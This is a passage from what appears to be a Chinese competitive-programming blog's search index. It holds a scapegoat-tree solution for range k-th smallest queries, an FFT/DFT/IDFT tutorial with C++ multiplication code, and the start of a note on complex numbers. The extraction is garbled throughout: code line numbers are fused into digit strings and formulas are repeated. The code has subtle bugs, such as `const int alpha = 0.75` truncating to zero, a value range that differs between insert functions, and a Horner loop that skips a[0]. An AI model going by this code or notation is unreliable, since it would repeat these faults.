27输出12345678910282310141514271514题解板子题板子题树套树乱搞即可替罪羊树大家应该都知道，每次不平衡时重构即可Code :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;stack&gt;const int alpha = 0.75;const int MAXN = 10000000 + 10;const int MAXM = 70000 + 10;inline int SlowRead () &#123; char ch = 0; int data = 0, f = 1; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if (ch == '-') f = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') &#123; data = data * 10 + ch - '0'; ch = getchar(); &#125; return data * f;&#125;inline int max (const int a, const int b) &#123; return a &gt; b ? a : b;&#125;inline int min (const int a, const int b) &#123; return a &lt; b ? a : b;&#125;inline void spaw (int &amp;a, int &amp;b) &#123; int temp = a; a = b; b = temp;&#125;int tmp;int n, m, sz, lastans, root;int v[MAXM], dfn[MAXM], rt[MAXM], ls[MAXM], rs[MAXM];struct seg&#123;int l,r,sum;&#125;a[MAXN];std::vector&lt;int&gt; rec;std::vector&lt;int&gt; t;std::vector&lt;int&gt; p;char ch[2]; int x, y, K;inline int newnode() &#123; if (rec.empty()) &#123; return ++sz; &#125; else &#123; int k = rec.back(); rec.pop_back(); return k; &#125;&#125;void reclaim (int &amp;x) &#123; if (!x) return; rec.push_back (x); reclaim (a[x].l); reclaim (a[x].r); a[x].sum = 0;x = 0;&#125;void insert (int &amp;k, int l, int r, int val, int f) &#123; if (!k) k = newnode(); if (l == r) &#123; a[k].sum += f; return; &#125; int mid = (l + r) &gt;&gt; 1; if (val &lt;= mid) &#123; insert (a[k].l, l, mid, val, f); &#125; else &#123; insert (a[k].r, mid + 1, r, val, f); &#125; a[k].sum = a[a[k].l].sum + a[a[k].r].sum; if (!a[k].sum) reclaim (k);&#125;void build (int &amp;k, int l, int r) &#123; if (l &gt; r) return; if (l == r) &#123; k = dfn[l]; insert (rt[k], 0, MAXN - 10, v[k], 1); return; &#125; int mid = (l + r) &gt;&gt; 1; k = dfn[mid]; build (ls[k], l, mid - 1); build (rs[k], mid + 1, r); for (int i = l; i &lt;= r; i++) &#123; insert (rt[k], 0, MAXN - 10, v[dfn[i]], 1); &#125;&#125;void del (int &amp;x) &#123; if (!x) return; reclaim (rt[x]); del (ls[x]); p.push_back (x); del (rs[x]); x = 0;&#125;void rebuild (int &amp;x) &#123; del (x); int s1 = p.size(); for (int i = 1; i &lt;= s1; i++) &#123; dfn[i] = p[i - 1]; &#125; build (x, 1, s1); p.clear();&#125;int modify (int k, int x, int val) &#123; insert (rt[k], 0, MAXN - 10, val, 1); int t, L = a[ rt[ls[k]] ].sum; if (L + 1 == x) &#123; t = v[k]; v[k] = val; &#125; else if (L &gt;= x) &#123; t = modify (ls[k], x, val); &#125; else &#123; t = modify (rs[k], x - L - 1, val); &#125; insert (rt[k], 0, MAXN - 10, t, -1); return t;&#125;void query (int k, int l, int r) &#123; int L = a[ rt[ls[k]] ].sum; int R = a[rt[k]].sum; if (l == 1 &amp;&amp; r == R) &#123; t.push_back(rt[k]); return; &#125; if (l &lt;= L + 1 &amp;&amp; r &gt;= L + 1) &#123; p.push_back(v[k]); &#125; if (r &lt;= L) &#123; query (ls[k], l, r); &#125; else if (l &gt; L + 1) &#123; query (rs[k], l - L - 1, r - L - 1); &#125; else &#123; if (l &lt;= L) query (ls[k], l, L); if (R &gt; L + 1) query (rs[k], 1, r - L - 1); &#125;&#125;int solve_query (int L, int R, int K) &#123; query (root, L, R); K--; int l = 0, r = MAXN - 10; int s1 = t.size(), s2 = p.size(); while (l &lt; r) &#123; int mid = (l+r)&gt;&gt;1,sum=0; for (int i = 0; i &lt; s1; i++) &#123; sum += a[ a[t[i]].l ].sum; &#125; for (int i = 0; i &lt; s2; i++) if (p[i] &gt;= l &amp;&amp; p[i] &lt;= mid) sum++; if (K &lt; sum) &#123; for (int i = 0; i &lt; s1; i++) &#123; t[i] = a[t[i]].l; &#125; r = mid; &#125; else &#123; for (int i = 0; i &lt; s1; i++) &#123; t[i] = a[t[i]].r; &#125; l = mid + 1; K -= sum; &#125; &#125; t.clear(); p.clear(); return l;&#125;void insert (int &amp;k, int x, int val) &#123; if (!k) &#123; k = ++n; insert (rt[k], 0, MAXM - 10, val, 1); v[k] = val; return; &#125; insert (rt[k], 0, MAXM - 10, val, 1); int L = a[rt[ls[k]]].sum; if (L &gt;= x) &#123; insert (ls[k], x, val); &#125; else &#123; insert (rs[k], x - L - 1, val); &#125; if (a[rt[k]].sum * alpha &gt; max(a[rt[ls[k]]].sum, a[rt[rs[k]]].sum)) &#123; if (tmp) &#123; if (ls[k] == tmp) &#123; rebuild (ls[k]); &#125; else &#123; rebuild (rs[k]); &#125; tmp = 0; &#125; &#125; else tmp = k;&#125;int main(int argc, char const *argv[]) &#123; n = SlowRead(); for (int i = 1; i &lt;= n; i++) &#123; v[i] = SlowRead(); &#125; for (int i = 1; i &lt;= n; i++) &#123; dfn[i] = i; &#125; build (root, 1, n); m = SlowRead(); while (m --&gt; 0) &#123; scanf("%s", ch); x = SlowRead(); y = SlowRead(); x ^= lastans; y ^= lastans; switch(ch[0]) &#123; case 'Q': &#123; K = SlowRead(); K ^= lastans; lastans = solve_query (x, y, K); printf ("%d\n", lastans); break; &#125; case 'M': &#123; modify (root, x, y); break; &#125; case 'I': &#123; tmp = 0; insert (root, x - 1, y); if (tmp) &#123; tmp = 0; rebuild (root); &#125; break; &#125; &#125; &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>树套树</tag>
        <tag>平衡树</tag>
        <tag>线段树</tag>
        <tag>替罪羊树</tag>
        <tag>区间第k小</tag>
        <tag>区间</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「数学」FFT / DFT / IDFT学习笔记]]></title>
    <url>%2Farticles%2FFFT-study%2F</url>
    <content type="text"><![CDATA[一天我们找到了一道题目：A * B Problem我们看到了 nnn 的范围： n≤6×104n \le 6\times 10^4n≤6×10​4​​我们写了一个高精交了上去，发现: ???我怎么T了四个点本文就教你一些 卡常技巧 算法优化在前面先给出AC 代码: （溜了溜了1input() and print(int(input()) * int(input()))显然的，高精乘是 O(n2)O(n^2)O(n​2​​) 的，会 TTT 到死我们想想如何优化qwq我们先看一道题，能更好说明性质题目描述 DescriptionDescriptionDescription都知道 FZFZFZ 酱数学不好，数学老师很着急，于是让她求个多项式的值。但是数学老师一不小心数据就出大了，他却并没有注意到这一点。老师共出了 TTT 道题，FZFZFZ 酱拿到了这 TTT 道题就崩溃了，请帮她尽快完成作业。输入 InputInputInput第一行一个整数 TTT，表示数据组数 对于每组数据： 第一行有一个数 nnn 表示这个多项式的次数界； 第二行有 nnn 个整数 ，表示多项式∑i=0n−1aixi\sum\limits_{i=0}^{n-1}a_ix^i​i=0​∑​n−1​​a​i​​x​i​​第三行，为未知数的值 xxx输出 OutputOutputOutput对于每组数据，输出一行，为答案。样例输入 SampleInputSample\;InputSampleInput2 2 3 2 100 3 1 2 3 -9样例输出 SampleOutputSample\;OutputSampleOutput203 226样例解释 ExplanationExplanationExplanation对于第一个多项式为 A(x)=2x+3A(x)=2x+3A(x)=2x+3，代入后得 A(100)=2×100+3=203A(100)=2\times 100+3=203A(100)=2×100+3=203 对于第二个多项式为 A(x)=3x2+2x+1A(x)=3x^2+2x+1A(x)=3x​2​​+2x+1，代入后得 A(−9)=226A(-9)=226A(−9)=226限制 LimitsLimitsLimits对于 50%50\%50% 的数据，答案在 [0,2128−1][0,2^{128}-1][0,2​128​​−1] 范围内； 对于 100%100\%100% 的数据，，，保证输入均为绝对值不大于 231−12^{31}-12​31​​−1 的整数并且答案小于 3×1063\times 10^63×10​6​​ 位那么很好我们必须写高精度了……高精度时间复杂度: O(pn2)O(p n^2)O(pn​2​​)快速幂我们可以使用快速幂来优化qwq由于挨个乘太慢了，这样会快时间复杂度: O(p2nlogn)O(p^2n\log n)O(p​2​​nlogn)Karatsuba 乘法我们采取一种类似分治的手法来解决这个问题比如我们计算 a×ba \times ba×b:我们把 aaa 和 bbb 拆分一下，于是令 a=a0×Bm+a1a = a_0\times B^m+a_1a=a​0​​×B​m​​+a​1​​，b=b0×Bm+b1b=b_0\times B^m+b_1b=b​0​​×B​m​​+b​1​​我们数了数，发现只要算出 a0b0,a1b1,(a0+a1)(b0+b1)a_0b_0, a_1b_1, (a_0+a_1)(b_0+b_1)a​0​​b​0​​,a​1​​b​1​​,(a​0​​+a​1​​)(b​0​​+b​1​​) 以及 666 次加法就可以了qwq我们来计算一下复杂度当然这个方法也可以用来计算多项式乘法，你只要认为 BBB 是多项式的形式变量就好了秦九韶算法秦九韶算法可以大量减少乘法和加法次数，并且把运算量简化为 O(n)O(n)O(n) 的qwqCode :12v = a[n - 1]for (int i = n - 2; i; i--) v = v * x + a[i];时间复杂度：O(p2n)O(p^2n)O(p​2​​n)回到正题上，我们讨论的是..快速傅里叶变换 - FFT 算法啥是多项式我们把形如 a0+a1x+a2x2+⋯+an−1xn−1a_0+a_1x+a_2x^2+\cdots+a_{n-1}x^{n-1}a​0​​+a​1​​x+a​2​​x​2​​+⋯+a​n−1​​x​n−1​​ 的式子叫做多项式，其中 a0,a1,⋯,an−1a_0,a_1,\cdots,a_{n-1}a​0​​,a​1​​,⋯,a​n−1​​ 称为多项式的系数，多项式中单项式个数为多项式的项数。因为多项式由单项式组成，规定最高次项的次数叫做多项式的次数，这里 A(x)A(x)A(x) 的次数为 n−1n-1n−1。xxx 为未知数。 以上内容均为初二（我记得是）的内容，不明白的自觉面壁思过（初中数学老师：这个定义抄 101010 遍给我）…… 下面就是没学过的了： 为方便表示，我们记多项式 a0+a1x+a2x2+⋯+an−1xn−1a_0+a_1x+a_2x^2+\cdots+a_{n-1}x^{n-1}a​0​​+a​1​​x+a​2​​x​2​​+⋯+a​n−1​​x​n−1​​ 为 A(x)A(x)A(x)，即：我们规定：严格大于 nnn 的任意整数为这个多项式的次数界，即次数的范围。多项式中任意单项式次数均严格小于次数界。（下面无特殊说明，多项式均用 A(x)A(x)A(x) 等类似形式表示多项式表示法向量表示法我们知道，向量是个好东西（？），矩阵也是个好东西（？），于是我们把三者结合起来看 我们将 n−1n-1n−1 次多项式的系数看成 nnn 维向量，即 a⃗=(a0,a1,⋯,an−1)\vec a=(a_0,a_1,\cdots,a_{n-1})​a​⃗​​=(a​0​​,a​1​​,⋯,a​n−1​​)，则称 a⃗\vec a​a​⃗​​ 为多项式 A(x)A(x)A(x) 的系数表示 在选修 4-2 中，我们知道向量与矩阵有着密切联系，这就是为什么我们把多项式，向量和矩阵联系起来.... 于是这个 nnn 维向量可以表示为一个 nnn 维列向量，为：[a0a1⋮an−1]\begin{bmatrix}a_0\\a_1\\\vdots \\a_{n-1}\end{bmatrix}​⎣​⎢​⎢​⎡​​​a​0​​​a​1​​​⋮​a​n−1​​​​​⎦​⎥​⎥​⎤​​点值表示法我们把多项式 A(x)A(x)A(x) 看做一个函数，选取不同的 nnn 个值 x0,x1,⋯,xn−1x_0,x_1,\cdots,x_{n-1}x​0​​,x​1​​,⋯,x​n−1​​ 代入 A(x)A(x)A(x) 中，可以得到 A(x)A(x)A(x) 的图像上 nnn 个不同的点，那么称点集 α={(xi,A(xi))∣i∈[0,n−1],i∈Z}\alpha=\{ (x_i,A(x_i))\mid i\in[0,n-1],i\in \mathbb{Z}\}α={(x​i​​,A(x​i​​))∣i∈[0,n−1],i∈Z} 为多项式 A(x)A(x)A(x) 的点值表示多项式加法多项式乘法这就是个开括号的问题…… 两个次数界为 na,nbn_a,n_bn​a​​,n​b​​ 的多项式 A(x),B(x)A(x),B(x)A(x),B(x) 相乘，得到的多项式 C(x)C(x)C(x) 的次数界为 na+nb−1n_a+n_b-1n​a​​+n​b​​−1 我们把不足的次数用系数 000 补充，变成两个齐次多项式 考虑怎样的两项乘完后，结果的幂指数为同一个。即 aixi×bjxj=ckxka_ix^i\times b_jx^j=c_kx^ka​i​​x​i​​×b​j​​x​j​​=c​k​​x​k​​，i,ji,ji,j 怎样取值才能使 kkk 为定值。显然 k=i+jk=i+jk=i+j 那么乘完之后，C(x)C(x)C(x) 就可以知道了我们把中间的那个加法，即 ci=∑j=0iajbi−jc_i=\sum\limits_{j=0}^ia_jb_{i-j}c​i​​=​j=0​∑​i​​a​j​​b​i−j​​ 叫做卷积。 这样，朴素算法时间复杂度为 O(n2)O(n^2)O(n​2​​)，显然不是太好。但是点值表达式的表示就很好了，直接乘起来就好了嘛！即：设 A(x)A(x)A(x) 的点值表示为α={(xi,A(xi))∣i∈[0,n−1],i∈Z}\alpha=\{ (x_i,A(x_i))\mid i\in[0,n-1],i\in \mathbb{Z}\}α={(x​i​​,A(x​i​​))∣i∈[0,n−1],i∈Z}设 B(x)B(x)B(x) 的点值表示为β={(xi,B(xi))∣i∈[0,n−1],i∈Z}\beta=\{ (x_i,B(x_i))\mid i\in[0,n-1],i\in \mathbb{Z}\}β={(x​i​​,B(x​i​​))∣i∈[0,n−1],i∈Z}然后就能得到 C(x)C(x)C(x) 的点值表示为：γ={(xi,A(xi)B(xi))∣i∈[0,n−1],i∈Z}\gamma=\{ (x_i,A(x_i)B(x_i))\mid i\in[0,n-1],i\in \mathbb{Z}\}γ={(x​i​​,A(x​i​​)B(x​i​​))∣i∈[0,n−1],i∈Z}但是这里只是两多项式的积。并不是真正的点值表示，不过也够用了差值 - 点值转化就要接近重点了同志们加油！ 先定义两个运算：定义一种运算，可以将系数表示转化为点值表示，记为 DFT(A(x))=α\text{DFT}(A(x))=\alphaDFT(A(x))=α定义其逆运算，即从一个多项式的点值表示确定其系数表示为插值。记为 DFT−1(α)=IDFT(α)=A(x)\text{DFT}^{-1}(\alpha)=\text{IDFT}(\alpha)=A(x)DFT​−1​​(α)=IDFT(α)=A(x)第一个运算在 xix_ix​i​​ 确定时唯一确定，那么第二个在 xix_ix​i​​ 确定时可不可以唯一确定 A(x)A(x)A(x) 呢qwq答案是肯定的我们把这些点代入，可以得出一个 nnn 元一次方程组，当 xix_ix​i​​ 均不相同时，可以唯一确定 a0,a1,⋯,ana_0,a_1,\cdots ,a_na​0​​,a​1​​,⋯,a​n​​。（如果有一个 xix_ix​i​​ 相同立刻变成不定方程）那么就很尴尬，DFT(A(x))\text{DFT}(A(x))DFT(A(x)) 的复杂度是 O(n2)O(n^2)O(n​2​​) 的，它的逆运算是 O(n3)O(n^3)O(n​3​​) 的（高斯消元）……还不如不优化了呢qwq复数具体可以看我上一篇Blog「数学」复数 &amp; 复平面本文继续讲复数与FFT/DFT/IDFT 的关系qwq单位根单位根定义：xn=1x^n=1x​n​​=1 的所有根叫做 nnn 次单位根qwq当我们把问题引入复数域，xxx 就不能简单计算为 x=1n=1x=\sqrt[n] 1=1x=​n​​√​1​​​=1了，而是在复平面内解决问题欧拉公式eiθ=cosθ+isinθe^{i\theta}=\cos\theta+i\sin\thetae​iθ​​=cosθ+isinθ我们来简单证明一下由 TaylorTaylorTaylor 展开可得江 TaylorTaylorTaylor 展开运用到复数域上，有复数运算 ±i=±i,(±i)2=−1,(±i)3=∓i,(±i)4=1\pm i=\pm i,(\pm i)^2=-1,(\pm i)^3=\mp i,(\pm i)^4=1±i=±i,(±i)​2​​=−1,(±i)​3​​=∓i,(±i)​4​​=1 ，可得证毕有什么用呢qwq?将 xxx 换成 π\piπ，就出现了 eπi=−1e^{\pi i}=-1e​πi​​=−1，即 eπi+1=0e^{\pi i}+1=0e​πi​​+1=0，被誉为上帝创造的公式将 xxx 换成 2kπ (k∈Z)2k\pi\ \ (k\in \mathbb{Z})2kπ (k∈Z)，就出现了 e2kπi=1e^{2k\pi i}=1e​2kπi​​=1等等.......我们好像求的不是这个啊qwq我们不是要解 xn=1x^n=1x​n​​=1 吗qwq那么 x=e2kπin (k∈Z)x=e^{\frac{2k\pi i}{n}} \ \ (k \in \mathbb{Z})x=e​​n​​2kπi​​​​ (k∈Z)，记这些单位根为 ωnk=e2kπin\omega _n^k=e^{\frac{2k\pi i}{n}}ω​n​k​​=e​​n​​2kπi​​​​下面就是一些数论问题了……记 k=nr+pk=nr+pk=nr+p，其中 p∈[0,n−1]p\in[0,n-1]p∈[0,n−1]，则 ωnk=e2pπin\omega _n^k=e^{\frac{2p\pi i}{n}}ω​n​k​​=e​​n​​2pπi​​​​这不一样吗qwq所以可以证明 k∈[0,n−1]k\in [0,n-1]k∈[0,n−1]也就是 nnn 次单位根有 nnn 个，不难发现，这 nnn 个单位根就是单位圆上的 nnn 个 nnn 等分点。 于是记这些根为 ωn0,ωn1,⋯,ωnn−1\omega_n^0,\omega_n^1,\cdots ,\omega_n^{n-1}ω​n​0​​,ω​n​1​​,⋯,ω​n​n−1​​，这些根各不相同，并且在乘法意义下构成一个群qwq，且证明如下qwq证毕qwq三个代表引理消去引理qwq内容：当 时，ωdndk=ωnk\omega_{dn}^{dk}=\omega_n^kω​dn​dk​​=ω​n​k​​证明：很简单……也很智障qwq折半引理qwq内容：如果 n&gt;0n&gt;0n&gt;0 且 nnn 为偶数，(ωnk)2=ωn2k(\omega_n^k)^2=\omega_{\frac{n}{2}}^k(ω​n​k​​)​2​​=ω​​2​​n​​​k​​ 证明：还行吧……可以看出，nnn 个 nnn 次单位根平方的集合就是 n2\frac{n}{2}​2​​n​​ 个 n2\frac{n}{2}​2​​n​​ 次单位根的集合，并且每个元素出现 222 次。可以通过单位根的对称性来理解更一般的结论：ωnk+n2=ωnn2ωnk=−ωnkωnn2=eπi=−1\omega_n^{k+\frac{n}{2}}=\omega_n^{\frac{n}{2}}\omega_n^k=-\omega_n^k \omega_n^{\frac{n}{2}}=e^{\pi i}=-1ω​n​k+​2​​n​​​​=ω​n​​2​​n​​​​ω​n​k​​=−ω​n​k​​ω​n​​2​​n​​​​=e​πi​​=−1求和引理内容：对于 ∀k∈(0,n)\forall k\in(0,n)∀k∈(0,n) ，有∑j=0n−1(ωnk)j=0\sum\limits_{j=0}^{n-1}(\omega_n^k)^j=0​j=0​∑​n−1​​(ω​n​k​​)​j​​=0证明：注意：ωnn=1\omega_n^n=1ω​n​n​​=1，化简省略了部分很多步骤。 现在全都就绪了，终于要到目标了……离散傅里叶变换 - DFT算法DFTDFTDFT，即 DiscreteFourierTransformDiscrete\;Fourier\;TransformDiscreteFourierTransform，离散傅里叶变换，就是我们之前定义的那个，现在有了复数，我们就可以在 O(nlog2n)O(n\log_2 n)O(nlog​2​​n) 的时间内做完 DFTDFTDFT 运算。运用到了 Cooley−TukeyCooley-TukeyCooley−Tukey 算法我们将多项式按照指数的奇偶分类，记原多项式为 A(x)A(x)A(x)，那么构造两个多项式通过观察可知，A(x)=A0(x2)+xA1(x2)A(x)=A_0(x^2)+xA_1(x^2)A(x)=A​0​​(x​2​​)+xA​1​​(x​2​​)，根据折半引理，我们考虑将 nnn 次单位根作为 xxx 代入计算。又因为折半引理，我们即可分治操作qwq那么，对于 k&lt;n2k&lt;\frac{n}{2}k&lt;​2​​n​​，有：这样，由奇偶性使得需要代入的值范围减半，递归做下去就行了qwq我们来分析一下时间复杂度qwq因为永远是奇偶合并，如果想要更方便地合并必然 nnn 取 222 的整数次幂，否则合并到一定时候左右不一定都是相同次数（可以考虑一个完全二叉树）。所以做的时候取 222 的整数次幂作为 nnn逆离散傅里叶变换 - IDFT算法IDFTIDFTIDFT，即 InverseDiscreteFourierTransformInverse\;Discrete\;Fourier\;TransformInverseDiscreteFourierTransform，逆离散傅里叶变换，还是我们之前定义的那个。我们在 O(nlog2n)O(n\log_2 n)O(nlog​2​​n) 的时间里搞定了 DFTDFTDFT，可是 IDFTIDFTIDFT 还是个 O(n3)O(n^3)O(n​3​​) 的，所以我们继续观（tui）察（da）性（shi）质（zi）我们说过，IDFT 相当于解个 n 元一次方程组，这个方程组写成矩阵形式是这样的：（化这个狮子化了 555 分钟.....这同时也是做 DFTDFTDFT 时我们乘的矩阵。只不过这次 aia_ia​i​​ 变成未知数了记上面的系数矩阵为 DDD，再考虑以下矩阵：[(ωn0)0(ωn0)1(ωn0)2⋯(ωn0)n−1(ωn−1)0(ωn−1)1(ωn−1)2⋯(ωn−1)n−1⋮⋮⋮⋱⋮(ωn−(n−1))0(ωn−(n−1))1(ωn−(n−1))2⋯(ωn−(n−1))n−1]\begin{bmatrix}(\omega_n^0)^0&amp; (\omega_n^0)^1&amp;(\omega_n^0)^2 &amp;\cdots &amp;(\omega_n^0)^{n-1}\\(\omega_n^{-1})^0&amp; (\omega_n^{-1})^1&amp;(\omega_n^{-1})^2&amp;\cdots &amp;(\omega_n^{-1})^{n-1}\\\vdots&amp;\vdots &amp;\vdots &amp;\ddots &amp;\vdots \\(\omega_n^{-(n-1)})^0 &amp; (\omega_n^{-(n-1)})^1&amp; (\omega_n^{-(n-1)})^2&amp;\cdots &amp; (\omega_n^{-(n-1)})^{n-1}\end{bmatrix}​⎣​⎢​⎢​⎡​​​(ω​n​0​​)​0​​​(ω​n​−1​​)​0​​​⋮​(ω​n​−(n−1)​​)​0​​​​​(ω​n​0​​)​1​​​(ω​n​−1​​)​1​​​⋮​(ω​n​−(n−1)​​)​1​​​​​(ω​n​0​​)​2​​​(ω​n​−1​​)​2​​​⋮​(ω​n​−(n−1)​​)​2​​​​​⋯​⋯​⋱​⋯​​​(ω​n​0​​)​n−1​​​(ω​n​−1​​)​n−1​​​⋮​(ω​n​−(n−1)​​)​n−1​​​​​⎦​⎥​⎥​⎤​​记此矩阵为 WWW，则记 E=D×WE=D\times WE=D×W。可知：当 i=ji=ji=j 时：当 时，由求和引理:这和 DFTDFTDFT 的操作很像，所以用 DFTDFTDFT 的过程实现 IDFTIDFTIDFT 即可负号？把 ωn1\omega_n^1ω​n​1​​ 改成 ωn−1\omega_n^{-1}ω​n​−1​​ 即可；1n\frac{1}{n}​n​​1​​ ？做完之后再除个 nnn 即可。现在 IDFTIDFTIDFT 也是 O(nlog2n)O(n\log_2 n)O(nlog​2​​n) 的了。至此，所有的时间都是 O(nlog2n)O(n\log_2 n)O(nlog​2​​n) 的了！即 FFTFFTFFT 的复杂度为 O(nlog2n)O(n\log_2 n)O(nlog​2​​n)说是一回事，写是另一回事奇偶分组这个玩意就很坑，容易发现，设 rir_ir​i​​ 为将 iii 的高位翻转到低位得到的数字（如 001100110011 就变成 110011001100），那么初始位置为 iii 的数就会被移动到 rir_ir​i​​，所以我们可以预先完成移动，然后合并计算。时间就会加快很多了不过 FFTFFTFFT 本身常数巨大，主要因为 double 类型的计算时间，还有使用 sin\sinsin,cos\coscos 函数带来的计算时间问题，所以常数问题一定要注意我们看到，DFTDFTDFT 做完后，得到的是将 nnn 次单位根代入后表达式的点值表示，IDFTIDFTIDFT 做完后，得到的是两多项式相乘的系数表示由于 FFTFFTFFT 涉及复数和除法，容易出现精度问题，所以考虑一种整数在模的前提下的 FFTFFTFFT，就出现了 FNTFNTFNT，也叫 NTTNTTNTT，即快速数论变换（Fast Number-theory Transform 或 Number Theory Transform）...如果我们计算卷积的时候 aaa,bbb 的下标不是相加为定值，而是一或二元逻辑运算（与，或，异或等等）后为定值，则可应用快速沃尔什变换（Fast Walsh Hadamard Transform).....FFTFFTFFT真是大毒瘤……FFTFFTFFT 和 FWTFWTFWT 都在图像处理，音频处理方面有较大应用下面给出代码代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;algorithm&gt;#define MAXN 1&lt;&lt;17using namespace std;const double pi=acos(-1.0);struct Complex&#123; double a,b; Complex()&#123;&#125; Complex(double _a,double _b):a(_a),b(_b)&#123;&#125; Complex(double _a):a(_a),b(0.0)&#123;&#125; inline Complex operator + (const Complex &amp;z)const&#123; return Complex(a+z.a,b+z.b); &#125; inline Complex operator - (const Complex &amp;z)const&#123; return Complex(a-z.a,b-z.b); &#125; inline Complex operator * (const Complex &amp;z)const&#123; return Complex(a*z.a-b*z.b,a*z.b+b*z.a); &#125; inline Complex operator / (const Complex &amp;z)const&#123; double m=z.a*z.a+z.b*z.b; return Complex((a*z.a+b*z.b)/m,(z.a*b-z.b*a)/m); &#125;&#125;;Complex a[MAXN],b[MAXN];int alen,blen,len,L,n,rev[MAXN],ans[MAXN];char _a[MAXN],_b[MAXN];inline void Clear()&#123; memset(a,0,sizeof a);memset(b,0,sizeof b); memset(ans,0,sizeof ans);L=0; return ;&#125;inline void FFT(Complex c[],int n,int f)&#123; Complex wn,w,x,y; for (int i=0;i&lt;n;i++) if (i&lt;rev[i]) swap(c[i],c[rev[i]]); for (int i=1;i&lt;n;i&lt;&lt;=1) &#123; wn=Complex(cos(pi/i),sin(pi/i)*f); for (int p=i&lt;&lt;1,j=0;j&lt;n;j+=p) &#123; w=Complex(1,0); for (int k=0;k&lt;i;k++,w=w*wn) &#123; x=c[j+k];y=w*c[j+k+i]; c[j+k]=x+y;c[j+k+i]=x-y; &#125; &#125; &#125; if (!~f) for (int i=0;i&lt;n;i++) c[i].a/=(double)n; return ;&#125;int main()&#123; while (~scanf("%s%s",_a,_b)) &#123; alen=strlen(_a);blen=strlen(_b);len=alen+blen; for (n=1;n&lt;alen+blen-1;n&lt;&lt;=1,L++); for (int i=0;i&lt;n;i++) rev[i]=(rev[i&gt;&gt;1]&gt;&gt;1)|((i&amp;1)&lt;&lt;(L-1)); for (int i=0;i&lt;alen;i++) a[i]=_a[alen-i-1]-'0'; for (int i=0;i&lt;blen;i++) b[i]=_b[blen-i-1]-'0'; FFT(a,n,1);FFT(b,n,1); for (int i=0;i&lt;n;i++) a[i]=a[i]*b[i]; FFT(a,n,-1); for (int i=0;i&lt;=len;i++) ans[i]=(int)(a[i].a+0.5); for (int i=0;i&lt;=len;i++) ans[i+1]+=ans[i]/10,ans[i]%=10; while (!ans[len]&amp;&amp;len) len--; for (int i=len;~i;i--) putchar(ans[i]+'0'); putchar('\n');Clear(); &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>DFT</tag>
        <tag>FFT</tag>
        <tag>IDFT</tag>
        <tag>教程</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「数学」复数 & 复平面]]></title>
    <url>%2Farticles%2F%E5%A4%8D%E6%95%B0%E8%A1%A8%E7%A4%BA%2F</url>
    <content type="text"><![CDATA[这篇文章我们来讲讲虚数的概念（本篇文章只是为了FFT铺垫复数其实很简单，就一个式子 i2=−1i^2=-1i​2​​=−1复数引入复数一天我们看到了一个方程：x2+1=0x^2 +1=0x​2​​+1=0这个方程在实数范围内明显是无解的qwq所以复数集可以看成实数集合的一个自然扩充首先引入一个新数 iii 使它满足i2=−1i^2=-1i​2​​=−1那么刚刚方程的解为x=ix=ix=i根据这个性质，我们就可以干一些有趣的事情了qwqax2+bx+c=0ax^2+bx+c=0ax​2​​+bx+c=0但是并非所有数都是 aiaiai 这种纯虚数的形式，可能还有常数 bbb ，于是我们把形如 z=a+biz=a+biz=a+bi 的 zzz 叫做复数明显的，我们可以给其分类qwq:当 b=0b = 0b=0 时，zzz 为实数当 b≠0&amp;a=0b \neq 0 \;\&amp;\; a=0b≠0&amp;a=0 时，zzz 为纯虚数当 a,b≠0a, b\neq 0a,b≠0 时，zzz 为复数复数的运算对于两个复数 z1=a+biz_1=a+biz​1​​=a+bi，z2=c+diz_2=c+diz​2​​=c+diz1+z2=(a+c)+(b+d)iz_1+z_2=(a+c)+(b+d)iz​1​​+z​2​​=(a+c)+(b+d)iz1−z2=(a−c)+(b−d)iz_1-z_2=(a-c)+(b-d)iz​1​​−z​2​​=(a−c)+(b−d)iz1×z2=(a+bi)(c+di)=(ac−bd)+(ad+bc)iz_1\times z_2=(a+bi)(c+di)=(ac-bd)+(ad+bc)iz​1​​×z​2​​=(a+bi)(c+di)=(ac−bd)+(ad+bc)iz1z2=a+bic+di=(a+bi)×(c−di)(c+di)×(c−di)=(ac+bd)+(bc−ad)ic2+d2\frac{z_1}{z_2}=\frac{a+bi}{c+di}=\frac{(a+bi)\times(c-di)}{(c+di)\times (c-di)}=\frac{(ac+bd)+(bc-ad)i}{c^2+d^2}​z​2​​​​z​1​​​​=​c+di​​a+bi​​=​(c+di)×(c−di)​​(a+bi)×(c−di)​​=​c​2​​+d​2​​​​(ac+bd)+(bc−ad)i​​复数的定理复数的加法满足交换律，结合律 也就是z1+z2=z2+z1z_1+z_2=z_2+z_1z​1​​+z​2​​=z​2​​+z​1​​(z1+z2)+z3=z1+(z2+z3)(z_1+z_2)+z_3=z_1+(z_2+z_3)(z​1​​+z​2​​)+z​3​​=z​1​​+(z​2​​+z​3​​)复数的乘法满足交换律、结合律，以及乘法对于加法的分配律也就是z1×z2=z2×z1z_1\times z_2=z_2\times 